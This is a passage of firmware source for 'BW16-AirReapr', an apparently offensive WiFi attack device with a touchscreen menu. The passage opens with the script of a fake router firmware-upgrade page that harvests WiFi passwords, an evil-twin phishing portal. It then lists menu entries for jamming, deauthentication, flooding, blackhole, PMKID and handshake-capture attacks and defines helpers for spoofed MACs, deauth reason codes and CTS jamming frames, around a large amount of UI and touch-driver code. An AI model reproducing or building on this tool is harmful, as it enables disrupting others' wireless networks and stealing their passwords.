$('st').textContent='升级超时，请重新输入密码';$('st').className='alert alert-err';
$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='登  录';$('pass').disabled=!1;$('pass').value='';}
},1000);
cid=setInterval(function(){var c=new XMLHttpRequest();c.open('GET','./check',!0);
c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){
var r=c.responseText.trim();
if(r=='1'){clearInterval(pid);clearInterval(cid);
$('bar').style.width='100%';$('pct').textContent='100%';
$('st').textContent='固件升级成功！设备即将自动重启';$('st').className='alert alert-ok';
$('progress').style.display='none';$('pct').style.display='none';}
else if(r=='2'){clearInterval(pid);clearInterval(cid);
$('st').textContent='密码错误，请重新输入';$('st').className='alert alert-err';
$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='登  录';$('pass').disabled=!1;$('pass').value='';}
}};c.send();},2000);
}
else{$('st').textContent='连接失败，请重试';$('st').className='alert alert-err';
$('btn').disabled=!1;$('btn').textContent='登  录';$('pass').disabled=!1;$('pass').value='';}}};
x.send()}
</script></body></html>
)rawliteral";

// ==================== 帧监视器 全局状态 ====================
// 帧计数器（volatile，由混杂回调异步更新）
static volatile unsigned long g_fmTotal    = 0;
static volatile unsigned long g_fmMgmt     = 0;
static volatile unsigned long g_fmCtrl     = 0;
static volatile unsigned long g_fmData     = 0;
static volatile unsigned long g_fmBeacon   = 0;
static volatile unsigned long g_fmProbeReq = 0;
static volatile unsigned long g_fmProbeResp= 0;
static volatile unsigned long g_fmDeauth   = 0;
static volatile unsigned long g_fmDisassoc = 0;
static volatile unsigned long g_fmAuth     = 0;
static volatile unsigned long g_fmAssoc    = 0;
static volatile unsigned long g_fmOtherMgmt= 0;
static volatile unsigned long g_fmLastSeen = 0;   // 上次收帧时间戳(ms)
static volatile int      g_fmLastRSSI     = 0;

// 最近帧环形缓冲区（供 UI 滚动显示）
struct FrameRecord {
  uint8_t type;       // 0=Mgmt, 1=Ctrl, 2=Data
  uint8_t subtype;
  uint8_t src[6];
  int     rssi;
};
#define FM_RECORD_MAX 64
static FrameRecord g_fmRecords[FM_RECORD_MAX];
static volatile int g_fmRecHead = 0;
static volatile int g_fmRecCount = 0;

// 监视器运行状态
static bool g_fmRunning = false;
static int  g_fmChannel = 1;
static unsigned long g_fmStartMs = 0;
static unsigned long g_fmLastDrawMs = 0;
static unsigned long g_fmTotalScanMs = 0;

// handshake.h 所需 LED 指示函数（BW16 无外接 LED，仅串口输出）
void completeHandshakeLED() {
  Serial.println(F("[Capture] 握手包捕获完成 - 绿灯指示"));
}

// ==================== WiFi 扫描 ====================
// WiFi AP 配置
char ssid_buf[] = "";
char pass_buf[] = "";
int current_channel = 1;


std::vector<WiFiScanResult> scan_results;
volatile bool g_scanDone = false;

// WiFi 列表 UI 状态
std::vector<uint8_t> selectedFlags;   // 多选标记 (与scan_results等长)
int wifiScrollOffset = 0;             // 列表滚动偏移
int wifiCursorIndex = -1;             // ⬅ 高亮光标索引 (-1=无), 基于scan_results全局索引

// ★ 检查是否已有选中目标（避免重复进入WiFi列表）★
static bool hasSelectedTargets() {
  for (size_t i = 0; i < selectedFlags.size(); i++) {
    if (selectedFlags[i]) return true;
  }
  return false;
}

// 设置待执行攻击并进入WiFi列表（变量声明必须在函数之前，故移至此位置）
void gotoWifiListForAttack(int attackType, int retScreen, int retIdx) {
  g_pendingAttackType = attackType;
  g_wifiReturnScreen = retScreen;
  g_wifiReturnMenuIdx = retIdx;
  g_touchValid = false;
  // 同步选标记尺寸：雷达刷新等操作可能改变 scan_results 但未更新 selectedFlags
  // 未同步则 selectedFlags[idx] 越界 → 内存破坏 → 崩溃
  selectedFlags.assign(scan_results.size(), 0);
  wifiScrollOffset = 0;
  wifiCursorIndex = -1;
  g_screen = SCREEN_WIFI_LIST;
  g_pendingWifiDraw = true;
  // 排干残留触摸事件（超时 200ms 防止用户持续按着导致死循环）
  { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 200) delay(10); }
}

// ==================== 菜单项中文文本 (UTF-8) ====================





// 按功能分组排列：扫描→攻击→监控→系统
const char* menuItems[] = {
  "1. 快速扫描",
  "2. 深度扫描",
  "3. 选择目标",
  "4. 攻击菜单",
  "5. 信道干扰",
  "6. 钓鱼攻击",
  "7. 广播黑洞",
  "8. 洪水攻击",
  "9. 抓包攻击",
  "10.无线雷达",
  "11.帧监视器",
  "12.攻击检测",
  "13.触摸校准",
  "14.系统设置",
  "15.Web配置"
};
const int MENU_COUNT = sizeof(menuItems) / sizeof(menuItems[0]);
int currentSelection = 0;

// ==================== 菜单区域布局 ====================
#define MENU_AREA_Y    42
#define MENU_ITEM_H    22
#define MENU_AREA_H    (MENU_ITEM_H * MENU_COUNT)
#define BTN_BAR_Y      (SCREEN_HEIGHT - 34)   // 参考值: 286
#define BTN_BAR_H      34                      // 参考值: 34
#define BTN_W          (SCREEN_WIDTH / 4)      // 参考值: 60
#define BTN_H          30

// ==================== WiFi列表区域布局 ====================
#define WIFI_LIST_Y       44
#define WIFI_LIST_ITEM_H  30
#define WIFI_LIST_VISIBLE 6
#define WIFI_LIST_BOTTOM  (WIFI_LIST_Y + WIFI_LIST_ITEM_H * WIFI_LIST_VISIBLE)  // 224
#define WIFI_BTN_BAR_Y    226
#define WIFI_BTN_BAR_H    94
#define WIFI_BTN_ROW1_Y   229
#define WIFI_BTN_ROW1_H   43
#define WIFI_BTN_ROW2_Y   276
#define WIFI_BTN_ROW2_H   40
// WiFi栏所有按钮统一宽度=BTN_W(60)，与主菜单一致

// ==================== XPT2046 触摸驱动 ====================
// XPT2046 SPI触摸读取（参考BW16-Tools工作代码）
uint16_t xpt2046_transfer(uint8_t cmd) {
  // 保存TFT_CS状态，确保TFT释放SPI总线
  bool tftCsState = digitalRead(TFT_CS);
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(TOUCH_CS, LOW);

  SPI.beginTransaction(SPISettings(2000000, MSBFIRST, SPI_MODE0));

  SPI.transfer(cmd);
  delayMicroseconds(10);
  uint16_t adc = SPI.transfer(0x00) << 8;
  adc |= SPI.transfer(0x00);
  adc >>= 3;  // 12-bit ADC

  SPI.endTransaction();
  digitalWrite(TOUCH_CS, HIGH);

  // 恢复TFT_CS状态
  digitalWrite(TFT_CS, tftCsState ? HIGH : LOW);

  return adc;
}

// 触摸读取（带去抖机制，参考BW16-Tools：无触摸时直接返回false，不争抢SPI）
bool touch_read(int16_t *tx, int16_t *ty) {
  unsigned long now = millis();

  // 去抖保持期内，返回缓存的上次坐标
  if (g_touchValid && (now - g_lastTouchTime < TOUCH_DEBOUNCE_MS)) {
    *tx = g_cachedTx;
    *ty = g_cachedTy;
    return true;
  }

  // 超过去抖时间，清除状态
  g_touchValid = false;

  uint16_t rawY = xpt2046_transfer(0x90);
  uint16_t rawX = xpt2046_transfer(0xD0);

  // 检测ADC值是否在有效范围内（数值范围检查）
  // XPT2046: 0xD0(rawX)=X水平, 0x90(rawY)=Y垂直
  if (rawX > numMinX && rawX < numMaxX && rawY > numMinY && rawY < numMaxY) {
    // 坐标转换: rawX→screenX, rawY→screenY
    // 直接用g_tsMin/g_tsMax（不作规范换），map()自动处理反转轴
    *tx = map(rawX, g_tsMinX, g_tsMaxX, 0, SCREEN_WIDTH);
    *ty = map(rawY, g_tsMinY, g_tsMaxY, 0, SCREEN_HEIGHT);

    // 串口输出触摸坐标（200ms节流，避免刷屏）
    {
      static unsigned long lastSerialMs = 0;
      static int16_t lastSerialTx = -1, lastSerialTy = -1;
      if (now - lastSerialMs >= 200 || *tx != lastSerialTx || *ty != lastSerialTy) {
        lastSerialMs = now;
        lastSerialTx = *tx; lastSerialTy = *ty;
        Serial.print("[触] X="); Serial.print(*tx);
        Serial.print(" Y="); Serial.print(*ty);
        Serial.print(" | rawX="); Serial.print(rawX);
        Serial.print(" rawY="); Serial.println(rawY);
      }
    }

    // 缓存坐标，记录时间
    g_cachedTx      = *tx;
    g_cachedTy      = *ty;
    g_lastRawX      = (int16_t)rawX;
    g_lastRawY      = (int16_t)rawY;
    g_lastTouchTime = now;
    g_touchValid    = true;
    return true;
  }

  return false;
}

// ==================== 绘制辅助 ====================
void drawRoundRect(int x, int y, int w, int h, int r, uint16_t color) {
  tft.drawRoundRect(x, y, w, h, r, color);
}

void drawButton(int x, int y, int w, int h, uint16_t bg, const char* label, uint16_t textColor) {
  tft.fillRoundRect(x, y, w, h, 4, bg);
  tft.drawRoundRect(x, y, w, h, 4, COLOR_BTN_BORDER);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(textColor);
  u8g2_for_adafruit_gfx.setBackgroundColor(bg);  // 设置背景色与按钮一致，消除黑边
  int fh = u8g2_for_adafruit_gfx.getFontAscent() - u8g2_for_adafruit_gfx.getFontDescent();
  u8g2_for_adafruit_gfx.setCursor(x + (w - u8g2_for_adafruit_gfx.getUTF8Width(label)) / 2, y + (h + fh) / 2);
  u8g2_for_adafruit_gfx.print(label);
}

// 清屏（填充背景色 + 重绘标题栏） — menu_system.cpp 通过 extern 调用
void clearScreen() {
  tft.fillScreen(COLOR_BG);
  tft.fillRect(0, 0, SCREEN_WIDTH, TITLE_BAR_H, COLOR_TITLE_BG);
}

// ==================== 绘制整个菜单界面（带滚动） ====================
void drawMenuUI() {
  // Web配置状态横幅：开启时预留一行高度，显示运行状态
  int bannerH = g_webConfigRunning ? 18 : 0;
  int visItems = MENU_VISIBLE - (bannerH > 0 ? 1 : 0);  // 横幅占用1行空间

  // 自动跟随选中项滚动
  if (currentSelection < g_menuScrollOffset) {
    g_menuScrollOffset = currentSelection;
  } else if (currentSelection >= g_menuScrollOffset + visItems) {
    g_menuScrollOffset = currentSelection - visItems + 1;
  }
  if (g_menuScrollOffset < 0) g_menuScrollOffset = 0;
  int maxOff = MENU_COUNT - visItems;
  if (maxOff < 0) maxOff = 0;
  if (g_menuScrollOffset > maxOff) g_menuScrollOffset = maxOff;

  tft.fillScreen(COLOR_BG);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);

  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_TITLE_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("BW16-AirReapr");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("BW16-AirReapr");

  // Web配置运行状态横幅（绿色）
  if (bannerH > 0) {
    tft.fillRect(0, 40, SCREEN_WIDTH, bannerH, 0x07E0);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(0x07E0);
    u8g2_for_adafruit_gfx.setCursor(10, 54);
    u8g2_for_adafruit_gfx.print("Web配置运行中  192.168.1.1  再次选中可关闭");
  }

  // 菜单区域分隔线（随横幅下移）
  int sepY = 40 + bannerH;
  tft.drawLine(0, sepY, SCREEN_WIDTH, sepY, 0x18E7);

  // 动态菜单起始 Y
  int menuStartY = sepY + 2;

  // 仅绘制可见窗口内的菜单项
  int endIdx = g_menuScrollOffset + visItems;
  if (endIdx > MENU_COUNT) endIdx = MENU_COUNT;
  for (int i = g_menuScrollOffset; i < endIdx; i++) {
    int drawRow = i - g_menuScrollOffset;
    int yy = menuStartY + drawRow * MENU_ITEM_H;

    if (i == currentSelection) {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, COLOR_MENU_SEL);
    } else {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, COLOR_BG);
    }

    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
    u8g2_for_adafruit_gfx.setBackgroundColor(i == currentSelection ? COLOR_MENU_SEL : COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(10, yy + 17);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
  }

  // 滚动条指示（右侧）
  if (MENU_COUNT > visItems) {
    int barX = SCREEN_WIDTH - 6;
    int barY = menuStartY + 1;
    int barH = visItems * MENU_ITEM_H - 2;
    tft.drawRect(barX, barY, 4, barH, 0x4208);
    int denom = MENU_COUNT - visItems;
    if (denom <= 0) denom = 1;
    int thumbH = barH * visItems / MENU_COUNT;
    int thumbY = barY + (barH - thumbH) * g_menuScrollOffset / denom;
    if (thumbY < barY) thumbY = barY;
    if (thumbY + thumbH > barY + barH) thumbY = barY + barH - thumbH;
    tft.fillRect(barX + 1, thumbY, 2, thumbH, 0x8410);
  }

  // 菜单区域底部分隔线
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);

  // 底部按钮栏
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(0,       BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_UP,   "上",   COLOR_WHITE);
  drawButton(BTN_W,   BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_DOWN, "下",   COLOR_WHITE);
  drawButton(BTN_W*2, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_OK,   "确认", COLOR_WHITE);
  drawButton(BTN_W*3, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_BACK, "返回", COLOR_WHITE);

  drawAreaBorders();  // 底部按钮栏分区围绕线

  // 同步增量重绘跟踪变量
  g_prevMenuSelection    = currentSelection;
  g_prevMenuScrollOffset = g_menuScrollOffset;
}

// ==================== 主菜单增量重绘（仅更新选中项，避免全屏重绘闪屏）====================

// 计算主菜单布局参数（与 drawMenuUI 保持一致）
static void getMenuLayout(int &bannerH, int &visItems, int &menuStartY) {
  bannerH = g_webConfigRunning ? 18 : 0;
  visItems = MENU_VISIBLE - (bannerH > 0 ? 1 : 0);
  int sepY = 40 + bannerH;
  menuStartY = sepY + 2;
}

// 重绘单个菜单项（idx=菜单项索引, selected=是否高亮）
static void drawSingleMenuRow(int idx, bool selected) {
  int bannerH, visItems, menuStartY;
  getMenuLayout(bannerH, visItems, menuStartY);
  int row = idx - g_menuScrollOffset;
  if (row < 0 || row >= visItems) return;
  int yy = menuStartY + row * MENU_ITEM_H;
  uint16_t bg = selected ? COLOR_MENU_SEL : COLOR_BG;
  tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, bg);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(bg);
  u8g2_for_adafruit_gfx.setCursor(10, yy + 17);
  u8g2_for_adafruit_gfx.print(menuItems[idx]);
}

// 仅重绘滚动条（不重绘整个菜单）
static void drawMenuScrollbarOnly() {
  int bannerH, visItems, menuStartY;
  getMenuLayout(bannerH, visItems, menuStartY);
  if (MENU_COUNT <= visItems) return;

  int barX = SCREEN_WIDTH - 6;
  int barY = menuStartY + 1;
  int barH = visItems * MENU_ITEM_H - 2;

  // 清除旧滚动条区域
  tft.fillRect(barX, barY, 4, barH, COLOR_BG);
  tft.drawRect(barX, barY, 4, barH, 0x4208);

  int denom = MENU_COUNT - visItems;
  if (denom <= 0) denom = 1;
  int thumbH = barH * visItems / MENU_COUNT;
  if (thumbH < 6) thumbH = 6;
  int thumbY = barY + (barH - thumbH) * g_menuScrollOffset / denom;
  if (thumbY < barY) thumbY = barY;
  if (thumbY + thumbH > barY + barH) thumbY = barY + barH - thumbH;
  tft.fillRect(barX + 1, thumbY, 2, thumbH, 0x8410);
}

// 重绘可见窗口内所有菜单项 + 滚动条（滚动偏移变化时使用）
static void redrawMenuVisibleItems() {
  int bannerH, visItems, menuStartY;
  getMenuLayout(bannerH, visItems, menuStartY);
  int endIdx = g_menuScrollOffset + visItems;
  if (endIdx > MENU_COUNT) endIdx = MENU_COUNT;
  for (int i = g_menuScrollOffset; i < endIdx; i++) {
    drawSingleMenuRow(i, (i == currentSelection));
  }
  drawMenuScrollbarOnly();
}

// 增量更新主菜单选中项（调用前 currentSelection 已更新，内部智能避免全屏重绘）
static void updateMainMenuSelection() {
  if (currentSelection < 0 || currentSelection >= MENU_COUNT) return;

  int bannerH = g_webConfigRunning ? 18 : 0;
  int visItems = MENU_VISIBLE - (bannerH > 0 ? 1 : 0);

  // 计算新的滚动偏移
  int maxOff = MENU_COUNT - visItems;
  if (maxOff < 0) maxOff = 0;

  if (currentSelection < g_menuScrollOffset) {
    g_menuScrollOffset = currentSelection;
  } else if (currentSelection >= g_menuScrollOffset + visItems) {
    g_menuScrollOffset = currentSelection - visItems + 1;
  }
  if (g_menuScrollOffset < 0) g_menuScrollOffset = 0;
  if (g_menuScrollOffset > maxOff) g_menuScrollOffset = maxOff;

  // 判断是否需要滚动重绘
  if (g_menuScrollOffset != g_prevMenuScrollOffset) {
    // 滚动偏移变化 → 重绘所有可见项+滚动条
    redrawMenuVisibleItems();
  } else {
    // 未滚动 → 仅更新新/旧两项
    if (g_prevMenuSelection != currentSelection) {
      drawSingleMenuRow(g_prevMenuSelection, false);
      drawSingleMenuRow(currentSelection, true);
    }
    // 滚动条位置刷新
    if (MENU_COUNT > visItems) {
      drawMenuScrollbarOnly();
    }
  }

  g_prevMenuSelection    = currentSelection;
  g_prevMenuScrollOffset = g_menuScrollOffset;
}
// ==================== 攻击子菜单绘制 ====================
void drawAttackMenuUI() {
  tft.fillScreen(COLOR_BG);

  // 标题栏
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_ATTACK_TITLE);  // 橙色标题
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_ATTACK_TITLE);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width("攻击菜单");
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print("攻击菜单");

  // 分隔线
  tft.drawLine(0, MENU_AREA_Y - 2, SCREEN_WIDTH, MENU_AREA_Y - 2, 0x18E7);

  // 攻击菜单项
  for (int i = 0; i < ATTACK_MENU_COUNT; i++) {
    int yy = MENU_AREA_Y + i * MENU_ITEM_H;
    if (i == g_attackMenuIdx) {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, COLOR_MENU_SEL);
    } else {
      tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, COLOR_BG);
    }

    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
    u8g2_for_adafruit_gfx.setBackgroundColor(i == g_attackMenuIdx ? COLOR_MENU_SEL : COLOR_BG);
    u8g2_for_adafruit_gfx.setCursor(10, yy + 17);
    u8g2_for_adafruit_gfx.print(attackMenuItems[i]);
  }

  // 底部分隔线
  tft.drawLine(0, BTN_BAR_Y - 2, SCREEN_WIDTH, BTN_BAR_Y - 2, 0x18E7);

  // 底部按钮栏
  tft.fillRect(0, BTN_BAR_Y, SCREEN_WIDTH, BTN_BAR_H, COLOR_BG);
  drawButton(0,       BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_UP,   "上",   COLOR_WHITE);
  drawButton(BTN_W,   BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_DOWN, "下",   COLOR_WHITE);
  drawButton(BTN_W*2, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_OK,   "确认", COLOR_WHITE);
  drawButton(BTN_W*3, BTN_BAR_Y + 2, BTN_W, BTN_H, COLOR_BTN_BACK, "返回", COLOR_WHITE);

  drawAreaBorders();  // 底部按钮栏分区围绕线

  // 同步增量重绘跟踪变量
  g_prevAttackMenuIdx = g_attackMenuIdx;
}

// ==================== 攻击菜单增量重绘（仅更新选中项，不碰标题栏/按钮栏）====================

static void drawSingleAttackMenuItem(int idx, bool selected) {
  int yy = MENU_AREA_Y + idx * MENU_ITEM_H;
  uint16_t bg = selected ? COLOR_MENU_SEL : COLOR_BG;
  tft.fillRect(2, yy, SCREEN_WIDTH - 4, MENU_ITEM_H - 1, bg);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_MENU_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(bg);
  u8g2_for_adafruit_gfx.setCursor(10, yy + 17);
  u8g2_for_adafruit_gfx.print(attackMenuItems[idx]);
}

static void updateAttackMenuSelection() {
  if (g_attackMenuIdx < 0 || g_attackMenuIdx >= ATTACK_MENU_COUNT) return;
  if (g_prevAttackMenuIdx != g_attackMenuIdx) {
    drawSingleAttackMenuItem(g_prevAttackMenuIdx, false);
    drawSingleAttackMenuItem(g_attackMenuIdx, true);
    g_prevAttackMenuIdx = g_attackMenuIdx;
  }
}

// ==================== 弹窗 ====================
void drawPopup(const char* title, const char* text) {
  // 计算描述行数以调整弹窗高度
  int lineCount = 1;
  for (const char* p = text; *p; p++) { if (*p == '\n') lineCount++; }
  int ph = 110 + lineCount * 18;   // 动态高度（1行128px，2行146px...）

  // 半透明蒙版效果：用深色覆盖
  tft.fillRect(0, MENU_AREA_Y, SCREEN_WIDTH, BTN_BAR_Y - MENU_AREA_Y, 0x0000);

  // 弹窗主体
  int pw = 220;
  int px = (SCREEN_WIDTH - pw) / 2, py = MENU_AREA_Y + 15;

  tft.fillRoundRect(px, py, pw, ph, 8, COLOR_POPUP_BG);
  tft.drawRoundRect(px, py, pw, ph, 8, COLOR_POPUP_TEXT);

  // 标题
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_TITLE_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_POPUP_BG);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(title);
  u8g2_for_adafruit_gfx.setCursor(px + (pw - tw) / 2, py + 22);
  u8g2_for_adafruit_gfx.print(title);

  // 分隔线
  tft.drawLine(px + 10, py + 35, px + pw - 10, py + 35, COLOR_POPUP_TEXT);

  // 描述文字 — 按 \n 分行输出，防止溢出弹窗
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_POPUP_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_POPUP_BG);
  int lineY = py + 55;
  const char* start = text;
  while (start && *start) {
    // 提取本行（到 \n 或结尾）
    const char* end = start;
    while (*end && *end != '\n') end++;
    int len = end - start;
    if (len > 0) {
      // 拷贝本行 + 截断到弹窗宽度（200px ≈ 16 汉字）
      char line[48];
      int copyLen = len < 47 ? len : 47;
      memcpy(line, start, copyLen);
      line[copyLen] = 0;
      u8g2_for_adafruit_gfx.setCursor(px + 10, lineY);
      u8g2_for_adafruit_gfx.print(line);
    }
    lineY += 18;
    start = (*end == '\n') ? end + 1 : NULL;
  }

  // 确认按钮
  int btw = 70, bth = 32;
  tft.fillRoundRect(px + 30, py + ph - 45, btw, bth, 4, COLOR_CONFIRM_BG);
  tft.drawRoundRect(px + 30, py + ph - 45, btw, bth, 4, COLOR_BTN_BORDER);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CONFIRM_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("确认");
  u8g2_for_adafruit_gfx.setCursor(px + 30 + (btw - tw) / 2, py + ph - 45 + 22);
  u8g2_for_adafruit_gfx.print("确认");

  // 取消按钮
  tft.fillRoundRect(px + pw - 30 - btw, py + ph - 45, btw, bth, 4, COLOR_CANCEL_BG);
  tft.drawRoundRect(px + pw - 30 - btw, py + ph - 45, btw, bth, 4, COLOR_BTN_BORDER);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CANCEL_BG);
  tw = u8g2_for_adafruit_gfx.getUTF8Width("取消");
  u8g2_for_adafruit_gfx.setCursor(px + pw - 30 - btw + (btw - tw) / 2, py + ph - 45 + 22);
  u8g2_for_adafruit_gfx.print("取消");
}

// ==================== 弹窗交互区域判断 ====================
// ph: 弹窗动态高度（与drawPopup保持一致：110 + lineCount*18）
PopupResult checkPopupHit(int16_t tx, int16_t ty, int ph) {
  int pw = 220;
  int px = (SCREEN_WIDTH - pw) / 2, py = MENU_AREA_Y + 15;
  int btw = 70, bth = 32;

  // 确认按钮区域
  int cx = px + 30, cy = py + ph - 45;
  if (tx >= cx && tx <= cx + btw && ty >= cy && ty <= cy + bth) return POPUP_CONFIRM;

  // 取消按钮区域
  cx = px + pw - 30 - btw;
  if (tx >= cx && tx <= cx + btw && ty >= cy && ty <= cy + bth) return POPUP_CANCEL;

  return POPUP_NONE;
}

// ==================== 函数前向声明 (Arduino .ino 需要) ====================
int scanNetworks(bool showUI = true, unsigned long timeoutMs = 2500);
void redrawWifiTitle();
void redrawWifiItemByIndex(int idx);
void redrawWifiListContent();
void redrawWifiScroll();
void drawWiFiListScreen();
void homeActionAttackMenu();
void homeActionDeepScan();
void homeActionSettings();
void homeActionTouchCalibrate(bool skipPrompt = false);
void attackDetect();
void attackPMKID();
void attackAuthFlood();
void attackCSA();
void attackBcastDeauth();
void attackBlackhole();

// ==================== 攻击辅助 ====================
// 广播MAC常量
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// Deauth原因码序列
const uint16_t DEAUTH_REASONS[] = {1, 4, 16};
const int DEAUTH_REASON_COUNT = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
#define MAC_PER_CYCLE 8  // AuthFlood每轮每个AP伪造MAC数

// CTS帧结构体 (802.11 控制帧，用于信道干扰)
struct CtsFrame {
  uint16_t frame_ctrl;   // 0x00C4 = CTS
  uint16_t duration;     // 信道占用时长 (微秒)，最大值32767
  uint8_t  ra[6];        // 接收地址 (广播MAC)
  // FCS由硬件自动添加
};

// 生成随机MAC地址
void generateRandomMAC(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] &= 0xFC;  // 清除最低两位
  mac[0] |= 0x02;  // 设置为随机静态地址
}

// ==================== 心电图表 (ECG) 攻击可视化 ====================
// 医学监护仪风格 — 绿色波形 + 网格 + 实时统计数据

static void initECG(const char* title) {
  g_ecgHead = 0;
  g_ecgCount = 0;
  g_ecgTotalPkts = 0;
  g_ecgLastPkts = 0;
  g_ecgCurPPS = 0;
  g_ecgMaxVal = 60;              // 初始高度60px
  g_ecgLastDraw = millis();
  g_ecgAttackStart = millis();
  g_ecgLastPPSms = millis();
  g_ecgTitle = title;
  memset(g_ecgBuf, 0, sizeof(g_ecgBuf));
}

// 绘制 ECG 静态框架（网格 + 标签）
static void drawECGFrame() {
  // 清空ECG区域背景
  tft.fillRect(ECG_GRID_X - 2, ECG_GRID_Y - 15, ECG_GRID_W + 4, ECG_GRID_H + 30, COLOR_BG);

  // 水平网格线 (5条: 顶/25%/50%/75%/底)
  uint16_t gridColor = 0x1926;   // 深绿灰网格线
  for (int i = 0; i <= 4; i++) {
    int gy = ECG_GRID_Y + (ECG_GRID_H * i) / 4;
    if (i == 2) {
      tft.drawLine(ECG_GRID_X, gy, ECG_GRID_X + ECG_GRID_W, gy, 0x2C6A);  // 中线略亮
    } else {
      // 虚线效果 — 每4px画2px
      for (int x = ECG_GRID_X; x < ECG_GRID_X + ECG_GRID_W; x += 4) {
        tft.drawPixel(x, gy, gridColor);
        tft.drawPixel(x + 1, gy, gridColor);
      }
    }
  }

  // 垂直虚线 (6条)
  for (int i = 0; i <= 6; i++) {
    int vx = ECG_GRID_X + (ECG_GRID_W * i) / 6;
    for (int y = ECG_GRID_Y; y < ECG_GRID_Y + ECG_GRID_H; y += 4) {
      tft.drawPixel(vx, y, gridColor);
      tft.drawPixel(vx, y + 1, gridColor);
    }
  }

  // 网格边框
  tft.drawRect(ECG_GRID_X, ECG_GRID_Y, ECG_GRID_W, ECG_GRID_H, 0x3CC7);

  // 标题标签 (网格左上)
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0x07E0);  // 医疗绿
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_BG);
  u8g2_for_adafruit_gfx.setCursor(ECG_GRID_X, ECG_GRID_Y - 3);
  u8g2_for_adafruit_gfx.print(g_ecgTitle);

  // Y轴标签 (右上)
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(0x3CC7);
  u8g2_for_adafruit_gfx.setCursor(ECG_GRID_X + ECG_GRID_W - 45, ECG_GRID_Y - 3);
  u8g2_for_adafruit_gfx.print("PPS");
}

// 绘制 ECG 波形线（完整重绘所有已有点）
static void drawECGWaveform() {
  int count = (g_ecgCount < ECG_BUF_SIZE) ? g_ecgCount : ECG_BUF_SIZE;
  if (count < 2) return;

  // 用背景色擦除旧波形区域（保留右边框 x=231 和下边框 y=141）
